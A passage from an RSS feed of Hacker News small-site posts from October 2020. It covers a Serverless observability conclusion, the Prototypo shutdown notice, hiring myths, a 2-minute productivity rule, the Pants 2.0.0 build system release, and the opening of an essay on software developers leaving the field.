<p>In a distributed systems world, doing all three pillars of observability well means that the time to detect, find and address bugs and other issues can be cut down to a fraction of what it would otherwise be. Furthermore, great observability will also improve developer productivity, since we can better understand the state of our entire system.</p>
<p>This is perhaps an area where AWS Serverless stands out as a leader. While the Kubernetes eco-system is filled with many options of various complexity and quality, AWS gives us an easy way to achieve a high level of observability at low effort and cost. <em>CloudWatch Logs, CloudWatch Metrics</em> and <em>AWS X-Ray</em> can provide observability to a Serverless architecture at a relatively low threshold of effort and learning.</p>
<h4 id="conclusion">Conclusion</h4>
<p>It should be obvious by now that Serverless &amp; distributed systems require great discipline in deployment automation. It is unfortunate that many still make the distinction between deployment being an “ops” concern, separate from development.</p>
<p>Dev &amp; Ops in modern systems are intertwined, the level and quality of automation has a great impact on DevEx (Developer Experience), and thus developer productivity. It is not a concern that can be postponed or thought about after the fact: it requires effort initially, and disciplined refinement throughout. If this is done well, you will be able to develop with a speed, reliability and level of productivity that will run rings around the competition.</p>
<p>We will return to this subject in the future to show what a practical Serverless toolchain and reference architecture could look like. Feel free to sign up to our email list below to get notified when we do!</p>
                  
                  </div></div>]]>
            </description>
            <link>https://chaordic.io/blog/serverless-distributed-system-productivity/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24912370</guid>
            <pubDate>Tue, 27 Oct 2020 21:52:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[10 years, 8 months and 12 days]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 14 (<a href="https://news.ycombinator.com/item?id=24911784">thread link</a>) | @app4soft
<br/>
October 27, 2020 | https://www.prototypo.io/blog/news/10-years-8-months-and-12-days/ | <a href="https://web.archive.org/web/*/https://www.prototypo.io/blog/news/10-years-8-months-and-12-days/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="lesanimals-page-wrapper" role="main">
        <section id="template-post-single" data-view-name="template-post-single" data-id="2969">

        <canvas data-text="News"></canvas>

        <span></span>

        

        <div>

            
            <div>
                <p>This article could have been entitled&nbsp;337,737,600 seconds, but hiding the fact that Prototypo started more than 10 years ago would have been a missed opportunity to show the dedication the team and I, as a founder, put in this project over the years.</p>
<p>Prototypo started as a student project when I studied Graphic Design at H.E.A.R Strasbourg in France. As a non-savvy Type Designer I was frustrated to not be able to complete the typeface projects I had in mind. Typefaces are made of rules and systems, right? Catcha! We can code something that follows rules, so we should succeed in coding fonts. That was the starting point of the next 10 years, and the beginning of the Roller Coaster, a.k.a creating a startup company.</p>
<p>Prototypo is a startup like many others: before having a stable and reliable business model, we put a lot of energy into developing innovative and useful technologies for our users.</p>
<p>But before being a startup, Prototypo is a company. Today we have reached the end of our resources without having found the expected Product Market Fit, and so the Break-even.</p>
<p>After several years of a strong dedication and passion for what we’ve built, we decided to shutdown the company.</p>
<p>Since the first second, I knew that it would be a hard journey with many obstacles on the path. But I regret nothing. The next 337,737,599 seconds were full of great experiences, shared with amazing people.</p>
<p>Thank you for those who supported us along the road, it was a great adventure.</p>
<p><a href="https://www.linkedin.com/in/yannick-mathey/">Yannick,</a> (former) CEO</p>

            </div>

            

        </div>

                    
        
    </section>
</section></div>]]>
            </description>
            <link>https://www.prototypo.io/blog/news/10-years-8-months-and-12-days/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24911784</guid>
            <pubDate>Tue, 27 Oct 2020 20:56:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hiring Myths Common in Hacker News Discussions]]>
            </title>
            <description>
<![CDATA[
Score 111 | Comments 137 (<a href="https://news.ycombinator.com/item?id=24911758">thread link</a>) | @Ozzie_osman
<br/>
October 27, 2020 | https://somehowmanage.com/2020/10/27/4-hiring-myths-common-in-hackernews-discussions/ | <a href="https://web.archive.org/web/*/https://somehowmanage.com/2020/10/27/4-hiring-myths-common-in-hackernews-discussions/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-222">

	

	
	<div>
		
<p>Another day, another HackerNews discussion about hiring being broken. The most recent one I saw was triggered by <a href="https://blog.alinelerner.com/ive-been-an-engineer-and-a-recruiter-hiring-is-broken-heres-why-and-heres-what-it-should-be-like-instead/">a blog post</a> by the formidable Aline Lerner (disclaimer: Aline is a friend and we collaborated on a <a href="https://www.holloway.com/g/technical-recruiting-hiring/about">hiring book</a> last year). Now, I 100% agree that hiring is broken, and Aline’s post is really thoughtful. In fact, a lot of “hiring is broken” articles are thoughtful.</p>



<p>But the discussion threads are something else—they miss the point of the article. The discussion threads are even more broken than hiring. And they’re really repetitive. They always do contain grains of truth, but inevitably have us reaching conclusions that are simplistic, and in my opinion, create a pretty bad attitude in the tech industry.</p>



<p><strong>Conclusion #1: “Hiring sucks for candidates, but hiring managers can do what they want</strong>“</p>



<p>The truth is that hiring is hard for everyone. There’s no question about it. It’s hard for both candidates and for hiring managers. Sure, FAANGs and the startup-du-jour might have a leg up, but most people who are hiring are trying to hire at a non-FAANG, non-sexy company. If you’ve never done it, you should try it at some point in your career. It’s an <em>incredibly </em>humbling experience. Or, at the very least, find a friend who’s spent time on hiring, and ask them for their favorite battle story. They’ve been ghosted by candidates. They’ve spent hours trying to convince people to talk to them. They’ve spent even more time getting candidates to the offer stage, only to lose out to the FAANG / startup-du-jour.</p>



<p>And yes, on the balance, power and information asymmetry work out in favor of the companies hiring. And that asymmetry is much larger with FAANGs. But even FAANGs have to invest a tremendous amount of time and energy into hiring. It’s not really easy for anyone. </p>



<p>Especially if you want to do it <em>well</em>. Ask any successful leader (entrepreneur, manager) what they spend most of their time on, and it’ll either involve a large chunk spent on hiring (if they appreciate the problem and give it the attention it deserves) or dealing with the consequences of bad hiring (if they don’t).</p>



<p><strong>Conclusion #2: “Hiring is a crap-shoot—it’s a roll of the dice</strong>“</p>



<p>I strongly disagree with this one. When writing the <a href="https://www.holloway.com/g/technical-recruiting-hiring">Holloway Guide to Technical Hiring and Recruiting</a>, I got to interview dozens of really thoughtful hiring managers and recruiters. They were really good at their jobs. And there were some common themes. They were thoughtful about every step of their process. They kept their process balanced and fair, holding a high bar but respecting candidates and their time. They didn’t chase the same pool of candidates everyone else was chasing—instead, they found non-traditional ways to discover really talented and motivated people who weren’t in the pool of usual suspects. They were thoughtful about what signals they were looking for and how best to assess them. And, they deeply understood their team’s needs, and candidates’ needs, and were really good at deciding when there was or wasn’t a fit. But most of all, they were effective: they built really talented teams.</p>



<p>There are a handful of companies that have built amazing hiring engines, and the proof is that they’ve been able to put together really strong teams. You can generally tell that if a person worked at a certain company at a certain time, that person is probably incredibly intelligent and incredibly motivated (some examples are Google, Facebook, Stripe, Dropbox at different points in time). There will always be noise. Even the best hiring managers will sometimes make hiring mistakes. And of course, even the best engineers may not be a fit for every role or every company. </p>



<p>Again, hiring is hard. But there is not a shred of doubt in my mind that if you are thoughtful about it, you can hire well. And really, you don’t need to be perfect at it. You just need to be better than the rest.</p>



<p><strong>Conclusion #3: “FAANGs suck at hiring”</strong></p>



<p>This one has some truth to it, but it’s a lot more subtle than “FAANGs suck at hiring”. Because let’s face it, they do hire really smart people. Some of the smartest people I know are at FAANGs right now. So let’s decouple that statement a little more.</p>



<p>FAANGs <em>do </em>suck at parts of hiring, like their candidate experience. They can be really slow at making hiring decisions. Their hiring process might be tedious and seem arbitrary. But <em>they usually can get away with it</em>, <em>and you probably can’t!</em> They’ve got a strong brand, interesting technical challenges (interesting for some people, at least), and a lot of money. In fact, one FAANG VP of Engineering told me: “our process is what we can get away with”. To the point that they can even play it off as a positive: “our process is slow and long because we are <em>very</em> selective”.</p>



<p>And look, I’m sure FAANGs lose some talented candidates who get turned off by their “you’d-be-blessed-to-work-with-us” attitude. They definitely have a lot of room for improvement. But at the end of the day, they’re operating a process that’s delivering large quantities of really smart people at scale. In fact, I’d argue their internal processes around strategy, performance management / promotions, etc cause incredibly <em>more</em> damage to them than broken hiring—if you lose out on hiring one talented person when you have thousands applying to work for you, that’s one story, but if you hire someone really talented and driven, and they work for you for 6 to 12 months but don’t meet their potential and leave in bitter frustration… well, that’s a subject for another post)</p>



<p>“But”, people go on, “FAANGs <em>also</em> don’t know how to interview!” Which brings me to trope #4.</p>



<p><strong>Conclusion #4: “Whiteboard</strong> <strong>and algo/coding interviews suck”</strong></p>



<p>Again, this one has some truth to it, but if you just stop at the above statement, you miss the point.</p>



<p>Algo/coding interviews are one of the primary hiring mechanisms used by FAANG companies. And they are incredibly unpopular—at least in discussion threads. But big companies have spent years looking at their hiring data and feeding that back into their hiring process (coining the term “<a href="https://rework.withgoogle.com/subjects/people-analytics/">people analytics</a>” along the way).</p>



<p>The argument against them is usually a combination of:</p>



<ul><li>they really only assess pattern-matching skills (map a problem to something you’ve seen before)</li><li>they only assess willingness to spend time preparing for these types of interviews</li></ul>



<p>These are fair criticisms, but that doesn’t mean these interviews are actually terrible. I mean, they might be terrible for you if you’re interviewing and you don’t get the job. You’re probably a brilliant engineer, and I agree, these interviews certainly don’t fully assess your ability (or maybe you’re a shit engineer, I don’t know you personally). In any case, the leap from “this interview sucked for me” to “this interview sucks” is still pretty big.</p>



<p>If you’re a large tech co with a big brand and a salary scale that ranks at the top of&nbsp;<a href="https://www.levels.fyi/">Levels.fyi</a>, you probably get a lot of applications. So a good interview process is one that weeds out people who wouldn’t do well at your company. To do well at a large tech company, you need to (and I’m painting with a really broad brush, but this is true for 90% of roles at these companies):</p>



<ol><li>Some sort of problem-solving skill that’s a mix of raw intelligence and/or ability to solve problems by pattern-matching to things you’ve seen before.</li><li>Ability/commitment to work on something that may not&nbsp;<em>always&nbsp;</em>be that intrinsically motivating, in the context of getting/maintaining a well-paying job at a large, known company.</li></ol>



<p>Hopefully you can see where I’m going with this. Basically, the very criticisms thrown at these types of interviews are the reason they work well for these companies. They’re a good proxy for the work you’d be doing there and how willing you are to do it. If you’re good at pattern matching, and are willing to invest effort into practicing to get one of these jobs, you’ll probably do well at the job.</p>



<p>Not that there’s anything wrong with that type of work. I spent several years at big tech co’s, and the work was intellectually stimulating most of the time. But a lot of times it wasn’t. It was a lot of pattern-matching. Looking at how someone else had solved a problem in a different part of the code-base, and adapting that to my use-case.</p>



<p>On the other hand, if you’re an engineer (no matter how brilliant) who struggles with being told what to do or doing work that you can’t immediately connect to something intrinsically motivating to you, that FAANG interview just did both you and the company a favor by weeding you out of the process.</p>



<p>So the truth is, there is no single “best interview technique”. In our book, we wrote several chapters about different interviewing techniques and their pros and cons. In-person algo/coding interviews on a whiteboard, in-person interviews where you work in an existing code base, <a href="https://www.holloway.com/g/technical-recruiting-hiring/sections/take-homes">take-home interviews</a>, pairing together, having a trial period, etc all have pros and cons. The trick is finding a technique that works for both the company and the candidate. </p>



<p>And that can really differ from company to company and candidate to candidate. A VP at Netflix told me about how they had a really strong candidate come in, but when asked to do a whiteboard-type interview, informed them (politely) that they might as well just reject him then. He was no good at whiteboard interviews… But if they allowed him to go home and write some code, he’d be happy to talk through it. And since then, many Netflix teams have offered candidates the choice of doing a take home.</p>



<p>And really, any interview format can suck. It can fail to assess a candidate for the things a company needs and it can be a negative candidate experience. Which would you rather have:</p>



<ul><li>A whiteboard interview with heavy algorithms for a role where that knowledge (or ability to develop that knowledge) isn’t critical, delivered by an apathetic engineer who doesn’t care about their job.</li><li>A …</li></ul></div></article></main></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://somehowmanage.com/2020/10/27/4-hiring-myths-common-in-hackernews-discussions/">https://somehowmanage.com/2020/10/27/4-hiring-myths-common-in-hackernews-discussions/</a></em></p>]]>
            </description>
            <link>https://somehowmanage.com/2020/10/27/4-hiring-myths-common-in-hackernews-discussions/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24911758</guid>
            <pubDate>Tue, 27 Oct 2020 20:53:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Get started with 2-minute rule]]>
            </title>
            <description>
<![CDATA[
Score 182 | Comments 52 (<a href="https://news.ycombinator.com/item?id=24911312">thread link</a>) | @hoanhan101
<br/>
October 27, 2020 | https://hoanhan.co/2-minute-rule | <a href="https://web.archive.org/web/*/https://hoanhan.co/2-minute-rule">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"><article role="article"><p>Scale any task down into a 2-minute version to make it easier to get started.</p><time datetime="2020-10-27T00:00:00-04:00"> October 27, 2020 · 1 min read · <a href="https://hoanhan.co/category/Motion">Motion</a><hr> </time><p>Whenever you find it hard to get started on a task, consider scaling it down into a 2-minute version. For example,</p><ul><li>Read a book → Read one page</li><li>Write an essay → Write one sentence</li><li>Run 10 miles → Wear my running shoes</li><li>Do 100 push-ups → Do 1 push up</li><li>Eat more vegetables → Eat an apple</li><li>Study for interview → Skim through my notes</li><li>Build a program → Code a function</li></ul><p>The idea is to make it super easy to get started. Once you pass the starting point, which is arguably the hardest step, you start to gain momentum to keep doing the task itself:</p><ul><li>Read one page → Read 10 pages → Finish the first chapter</li><li>Write one sentence → Write an opening paragraph → Write the body</li><li>Wear my running shoes → Walk for 5 minutes → Run for 5 minutes</li></ul><p>As you can see, once you start, it is much easier to continue doing it. Sometimes, you’ll find yourself completing the task even before you even notice it.</p><blockquote><p>For more insights on system planning and goal setting, feel free to check out <a href="https://hoanhan.co/motion">this guide</a>. If you’re curious about how I apply it on a daily basis, <a href="https://motion.hoanhan.co/goals/hoanhan/">check this out →</a></p></blockquote><hr><p><strong>References:</strong></p><ul><li><a href="https://jamesclear.com/how-to-stop-procrastinating">https://jamesclear.com/how-to-stop-procrastinating</a></li><li><a href="https://www.lifehack.org/articles/productivity/how-stop-procrastinating-and-stick-good-habits-using-the-2-minute-rule.html">https://www.lifehack.org/articles/productivity/how-stop-procrastinating-and-stick-good-habits-using-the-2-minute-rule.html</a></li></ul><hr><hr><p> Tagged: <a href="https://hoanhan.co/tag/motion.hoanhan.co">#motion.hoanhan.co</a>, <a href="https://hoanhan.co/tag/consistency">#consistency</a>, <a href="https://hoanhan.co/tag/start">#start</a></p><br> </article></div></div>]]>
            </description>
            <link>https://hoanhan.co/2-minute-rule</link>
            <guid isPermaLink="false">hacker-news-small-sites-24911312</guid>
            <pubDate>Tue, 27 Oct 2020 20:13:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pants 2.0.0 released – Concurrently cache and orchestrate modern Python builds]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24911148">thread link</a>) | @stuhood
<br/>
October 27, 2020 | https://blog.pantsbuild.org/introducing-pants-v2/ | <a href="https://web.archive.org/web/*/https://blog.pantsbuild.org/introducing-pants-v2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<h3 id="pants-2-0-0-the-first-stable-release-of-the-pants-v2-open-source-build-system-is-out-now-">Pants 2.0.0, the first stable release of the Pants v2 open-source build system, is out now!</h3><p>There are so many tools in the Python development ecosystem. You might use <a href="https://pip.pypa.io/en/stable/">pip</a> to resolve dependencies, <a href="https://docs.pytest.org/en/stable/">pytest</a> to run tests, <a href="https://flake8.pycqa.org/en/latest/">flake8</a> and <a href="https://www.pylint.org/">pylint</a> for lint checks, <a href="https://black.readthedocs.io/en/stable/">black</a> and <a href="https://pycqa.github.io/isort/">isort</a> for auto-formatting, <a href="http://mypy-lang.org/">mypy</a> for type checking, <a href="https://ipython.org/">IPython</a> or <a href="https://jupyter.org/">Jupyter</a> for interactive sessions, <a href="https://setuptools.readthedocs.io/en/latest/">setuptools</a>, <a href="https://pex.readthedocs.io/en/latest/">pex</a> or <a href="https://www.docker.com/">docker</a> for packaging, <a href="https://developers.google.com/protocol-buffers">protocol buffers</a> for code generation, and many more. Not to mention any custom tooling you've built for your repo. </p><p>Installing, configuring and orchestrating the invocation of these tools<strong>—</strong>all while not re-executing work unnecessarily<strong>—</strong>is a hard problem, especially as your codebase grows. The lack of a robust, scalable build system for Python has been a problem for a long time, and this has become even more acute in recent years, with Python codebases increasing in size and complexity. </p><p>Fortunately, there is now a tailor-made (pun intended) solution: <strong>Pants v2</strong>!</p><p><a href="https://www.pantsbuild.org/">Pants v2</a> is designed from the ground-up for fast, consistent builds. Some noteworthy features include:</p><ul><li>Minimal metadata and boilerplate</li><li>Fine-grained workflow</li><li>Shared result caching</li><li>Concurrent execution</li><li>A responsive, scalable UI</li><li>Unified interface for multiple tools and languages</li><li>Extensibility and customizability via a plugin API</li></ul><figure><img src="https://blog.pantsbuild.org/content/images/2020/10/render1603750306032.gif" alt=""><figcaption>Pants running multiple linters in parallel</figcaption></figure><p>Read on to learn more about Pants v2, and what it means for your Python codebase.</p><hr><h2 id="a-little-history">A little history</h2><p>We started the original open-source Pants project back in 2011. At the time, we were frustrated by slow, flaky Scala builds. The leading strategy for scaling was to hand each developer a RAM stick and a screwdriver... Surely this was a problem we could tackle with software! Thus Pants v1 was born. </p><p>Pants v1 was quite successful, and was adopted at cutting-edge tech companies such as Twitter, Foursquare, Square and others. But we still weren't satisfied: The APIs were clunkier than we would have liked, the UI was overly chatty, caching was hard to get right, and concurrent execution had to be special-cased. We knew there were plenty of performance and stability improvements to be had, if we could only unlock them. </p><p>We learned a lot from our years of work on Pants v1, and knew that we could design something new and better, leaning on our experience with v1 while addressing the drawbacks of that system. Luckily, at the same time as we began thinking about this hypothetical next system, a new motivating problem emerged: Python builds.</p><h2 id="python-builds-today">Python builds today</h2><p>As you probably know, Python has skyrocketed in popularity in recent years. Not only is it used to build a wide variety of server applications, via frameworks such as <a href="https://www.djangoproject.com/">Django</a> and <a href="https://flask.palletsprojects.com/en/1.1.x/">Flask</a>, but it's also the language of choice for data scientists, thanks to powerful libraries and tools such as <a href="https://numpy.org/">NumPy</a>, <a href="https://www.scipy.org/">SciPy</a>, <a href="https://pandas.pydata.org/">Pandas</a> and <a href="https://jupyter.org/">Jupyter</a>. </p><p>Python hits a sweet spot of simplicity and power, but there is a big problem - there is no truly great scalable build tool for Python, and this is becoming a real pain point as Python repos grow like never before. &nbsp;</p><p>Python builds today involve manually invoking a wide variety of tools. Each tool has to be installed, configured and invoked in just the right way, often while sequencing the output of one tool into input of another. Knowing how to use each tool in a given scenario is complicated and burdensome. </p><p>Sure, you can hack around the problem for a while with some combination of shell scripts, <a href="https://www.gnu.org/software/make/manual/make.html">Makefiles</a>, <a href="https://tox.readthedocs.io/en/latest/">tox</a>, and <a href="https://python-poetry.org/">poetry</a>. But even a small code change might require you to run a huge amount of sequential build work. Re-executing the same processes with the same inputs over and over again is a frustrating waste of time and resources. &nbsp;And these solutions start to break down as your codebase grows.</p><p>Perhaps you experimented with more complex build systems, such as <a href="https://bazel.build/">Bazel</a> or <a href="https://v1.pantsbuild.org/">Pants v1</a>. &nbsp;But it's laborious to maintain all that BUILD metadata, all for a sub-par experience not optimized for Python. Not to mention the difficulty of implementing your own custom build logic. </p><p>Alternatively, maybe you've been tempted to split up your codebase into multiple interdependent repos, each with their own "smaller" builds. But that creates an even thornier problem, namely how to manage those interdependencies. Having to propagate changes across codebase boundaries can slow development down to a crawl, and leave you with the worst of both worlds - slower processes and a fragmented, unmanageable codebase.</p><p>A great build system for repos - of all sizes - that include Python code would support fine-grained invalidation and caching, so that it only executes the build work actually affected by a change. It would support concurrent local and even remote execution, to greatly speed up work by using all available CPU. It would be easy to adopt in a small repo, but would scale up as your codebase grows. It wouldn't require huge amounts of boilerplate metadata, and it would be easy to extend with custom build logic. </p><p>Well, Pants v2 is that system! </p><h2 id="introducing-pants-v2">Introducing Pants v2</h2><p><a href="https://www.pantsbuild.org/">Pants v2</a> is a completely new open-source build system, inspired by our work on Pants v1. &nbsp;We've been developing and testing it for the last couple of years, and it's finally ready for prime time!</p><p>A key factor in the design of Pants v2 was a set of lessons we learned from Pants v1 and other existing systems, such as Bazel. Among them: that ease of use and performance matter, boilerplate is annoying, concurrency and caching require hard design work, and most people will need custom logic at some point.</p><h3 id="lesson-1-ease-of-use-and-performance-both-matter">Lesson #1: Ease of use and performance both matter</h3><p>When designing software you often find yourself making tradeoffs between ease of use and performance. But in a build system, both are vital. The Pants v2 execution engine - which is the performance-critical heart of the system - is written in <a href="https://www.rust-lang.org/">Rust</a>, for raw speed. And the domain-specific build logic is written in familiar, easy to work with, type-annotated Python 3. This helps make Pants v2 easy to extend, without compromising performance. </p><p>Pants v2 also runs a daemon that memoizes fine-grained build state in memory, for even faster performance. This daemon watches for changes to your source files and precisely invalidates its state on the fly to ensure that the minimum amount of work happens the next time you build.</p><h3 id="lesson-2-writing-build-metadata-is-a-real-drag">Lesson #2: Writing build metadata is a real drag</h3><p>Some build tools are slow because they don't have enough information about the structure of your code to intelligently perform incremental work. Others have gone too far in the other direction, requiring a huge amount of metadata and boilerplate in BUILD files, especially relating to your code's dependencies. </p><p>Pants v2 offers the best of both worlds - intelligent, fine-grained incremental work, without the boilerplate. It does so by assuming sensible, magic-free defaults, inferring dependencies from the import statements in your code, and supporting plugins for custom inference logic. Stay tuned for an upcoming post on exactly how Pants achieves this!</p><h3 id="lesson-3-design-for-caching-concurrency-and-remoting">Lesson #3: Design for caching, concurrency and remoting </h3><p>Writing build logic that can be cached and executed concurrently and remotely is very hard. You have to be very careful about not producing or consuming side-effects, and it's extremely difficult to tack that on later. And unless you design your APIs with care, supporting these kinds of features often places severe restrictions on what your build logic may safely do. </p><p>In Pants v2, build logic is composed of <a href="https://en.wikipedia.org/wiki/Pure_function">pure</a> Python 3 <a href="https://docs.python.org/3/library/asyncio-task.html">async coroutines</a>. So a build rule can depend not only on its inputs, but can also await on new data at runtime - all of which is precisely tracked for invalidation and caching. This gives us the best of both worlds: logic that is properly isolated from side-effects, and is therefore amenable to caching, concurrent execution and remoting, while still allowing the use of natural control flow.</p><figure><img src="https://blog.pantsbuild.org/content/images/2020/10/caching.gif" alt=""><figcaption>We run both tests, then add a syntax error to one test and rerun; the unmodified test uses the cache and is isolated from the syntax error.</figcaption></figure><h3 id="lesson-4-almost-everyone-needs-to-customize-their-builds">Lesson #4: Almost everyone needs to customize their builds</h3><p>Most teams have custom build steps, so extensibility is a key feature in any build system. Pants v2 is built around a <a href="https://www.pantsbuild.org/docs/plugins-overview">plugin architecture</a>. You can write your own rules using the same API as the built-in functionality. So your custom build logic will enjoy the same fine-grained invalidation, caching, concurrency and remote execution abilities as the core Pants code.</p><h2 id="pants-2-0-0-is-out-now-">Pants 2.0.0 is out now!</h2><p>All this leads me to the happy announcement that <a href="https://pypi.org/project/pantsbuild.pants/2.0.0/">Pants 2.0.0</a>, the first stable release of Pants v2, is out now! 2.0.0 is the culmination of years of design and development work, and many months of beta testing at several organizations. So we're really happy, proud (and relieved…) to finally have it ready for general use. </p><p>You can see what Python tools Pants currently supports <a href="https://www.pantsbuild.org/docs/python">here</a>. There are also commands for querying and understanding your dependency graph, and a robust help system. &nbsp;We're adding support for additional tools and features all the time, and it's straightforward to implement your own. Beta users have already written their own logic for Cython and docker, for example. </p><p>Now is a great time to adopt Pants 2.0.0! The team that developed Pants v2 is <a href="https://www.pantsbuild.org/docs/community">ready to help you</a> onboard, answer any questions, and even pair with you to help you write any custom build logic. We're also eager to get feedback, bug reports and suggestions for what features we should focus on in the next weeks and months of development.</p><p>Pants v2 is developed by a helpful open source community, is funded by a 501(c)6 non-profit, and has excellent support available. If you have a growing Python codebase, and want to take Pants 2.0.0 for a spin, <a href="https://www.pantsbuild.org/docs/community">let us know</a>. We'd love to fit you with some new Pants today!</p>
			</section></div>]]>
            </description>
            <link>https://blog.pantsbuild.org/introducing-pants-v2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24911148</guid>
            <pubDate>Tue, 27 Oct 2020 19:58:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We Will Never Have Enough Software Developers]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24910949">thread link</a>) | @bartdegoede
<br/>
October 27, 2020 | https://whoisnnamdi.com/never-enough-developers/ | <a href="https://web.archive.org/web/*/https://whoisnnamdi.com/never-enough-developers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://whoisnnamdi.com/content/images/size/w300/2020/10/header-v2-resized.png 300w,
                            https://whoisnnamdi.com/content/images/size/w600/2020/10/header-v2-resized.png 600w,
                            https://whoisnnamdi.com/content/images/size/w1000/2020/10/header-v2-resized.png 1000w,
                            https://whoisnnamdi.com/content/images/size/w2000/2020/10/header-v2-resized.png 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://whoisnnamdi.com/content/images/size/w2000/2020/10/header-v2-resized.png" alt="Why We Will Never Have Enough Software Developers">
            </figure>

            <section>
                <div>
                    <p>We will never have enough software developers.</p><p>Developers are dropping out of the profession in large numbers despite efforts to grow the number of computer science graduates and software engineers.</p><p>Here's why.</p><h2 id="developer-dropout-is-real">Developer dropout is real</h2><p>Software development has a <em>serious</em> retention problem:</p><ul><li>At age 26, 59% of engineering and computer science grads work in occupations <em>related</em> to their field of study. By age 50, only 41% work in the same domain, meaning a full <strong>~30% drop out of the field by mid-career</strong></li><li>In contrast, engineering and computer science majors who join <em>unrelated</em> fields upon graduation retain at much higher rates, with only 10-15% switching out after the age of 26:</li></ul><figure><img src="https://whoisnnamdi.com/content/images/2020/10/W-kECKz1nw.png"></figure><p>Engineers often leave engineering for non-STEM management roles. Graduation into management is not surprising. What's surprising is that these are <strong>non-STEM</strong> positions. Engineers swap technical roles for <em>non-technical</em> roles over time.</p><p>This phenomenon, which I'll call "<strong>developer dropout</strong>," is a real problem. What's behind it?</p><!--kg-card-begin: html--><section>
    <h3>Receive my next long-form post</h3><p>Thoughtful analysis of the business and economics of tech</p>
                

</section><!--kg-card-end: html--><h2 id="out-with-the-old-skills-in-with-the-new-skills">Out with the old skills, in with the new skills</h2><p>Programming-related jobs have high rates of skill turnover. Over time, the types of skills required by companies hiring software developers change more rapidly than any other profession.</p><p>To demonstrate this, <a href="https://academic.oup.com/qje/article/135/4/1965/5858010">researchers</a> analyzed job postings on more than 40,000 online job boards and company websites between 2007 and 2019, controlling for employer, location, and occupation. They defined "new" skills as those that were rare or non-existent in 2007 but prevalent in 2019 and "old" skills as those that were prevalent in 2007 but rare or extinct in 2019.</p><ul><li>While only 30% of all job vacancies required at least one new skill by 2019, <strong>47% of computer and mathematical jobs required at least one new skill</strong> (i.e. a skill that was not common back in 2007)</li><li>This compares to <em>less than 20%</em> of jobs in fields like education, law, and community and social services</li><li>In addition, <strong>16% of jobs in computer and mathematical fields in 2007 required a skill that was obsolete by 2019</strong> (i.e. a skill that was common in 2007 but relatively rare in 2019), more than double any other job category:</li></ul><figure><img src="https://whoisnnamdi.com/content/images/2020/10/azDsA9n3rx.png"></figure><p>About a third of the change in required skills in computer-related occupations is due to specific new software:</p><ul><li>The fastest-growing software skills between 2007 and 2019 include <strong>Python, R, and Apache Hadoop</strong></li><li>Software that was popular in 2007 but effectively obsolete by 2019 includes QuarkXpress, ActionScript, Solaris, IBM Websphere, and Adobe Flash (ah, finally a name I recognize)</li></ul><p>Data science, machine learning, and AI saw big increases among technology-intensive jobs as well. For example, the number of STEM-related jobs requiring skills in machine learning and AI grew more than 4x from 2007-2017, touching more than 15% of STEM jobs:</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/Pc3AjVflhW.png"></figure><p>To better compare rates of skill change across occupations, the researchers came up with a measure of skill change that tracks the absolute growth or decline of various skills within each profession from 2007 to 2019. Occupations whose required skills change rapidly in prevalence among job postings receive a high score, while jobs whose skills do not change much receive a lower score:</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/xfeKvOWxo-.png"></figure><ul><li><strong>Computer-related occupations receive the highest score by far, 4.8</strong>. Note that the mean and standard deviation of this measure are ~3 and ~1 respectively, so computer-related jobs are <strong>nearly two standard deviations away from the typical job in America</strong></li><li>Meanwhile, jobs in education and and those involving manual labor have very low skill change scores, typically less than 2.</li></ul><p>We can get even more granular and look at specific job roles. This level of detail makes the difference even more stark (only showing the fastest changing roles):</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/OwoB5xsSdO.png"></figure><p>Web development has the highest rate of skill change <em>among all jobs in the country</em>. Next up are sales engineers, another often technical role. Database administrators, computer network architects, sysadmins, and application developers all make the top 10, and we see many other technical roles among the top 30. The mean and standard deviation are similar here, placing web development <strong>more than 3 standard deviations away from the typical job in America</strong> in terms of skill change over time.</p><p>Suffice to say, <strong>software development is a rapidly changing profession</strong>.</p><p>You might think, however, that skill change would eventually settle down as one becomes more experienced.</p><p><em>You'd be wrong.</em> The skills for software engineering jobs change rapidly throughout the entire career lifecycle:</p><figure><img src="https://whoisnnamdi.com/content/images/2020/10/7ItjXMaTE-.png"></figure><ul><li>In entry-level roles in computer and engineering occupations all the way through those requiring 12+ years of experience, <strong>the proportion of job postings requiring at least one new skill in 2019 was effectively the same, 40-45%</strong></li><li>In contrast, <strong>29% of entry-level non-computing and engineering roles in 2019 required at least one new skill, but this proportion declines to 24%</strong> for jobs requiring more than four years of experience</li></ul><blockquote>This means that experienced STEM workers seeking employment in 2019 are often required to possess skills that <strong>were not required</strong> when they entered the labor market in 2007 or earlier.</blockquote><p>Software engineers <strong>never</strong> escape the skill-change vortex, even many years into their careers. Experienced engineers must learn and adopt technologies that didn't even exist when they started out. Developers must constantly retool themselves, even well after their <a href="https://whoisnnamdi.com/college-degrees-software-engineers/">formal education</a> ends.</p><h2 id="nothing-s-changed-but-my-change"><a href="https://youtu.be/m1ERvlxgCD8?t=166">Nothing's changed but my change</a></h2><p><strong>College majors associated with faster changing jobs pay 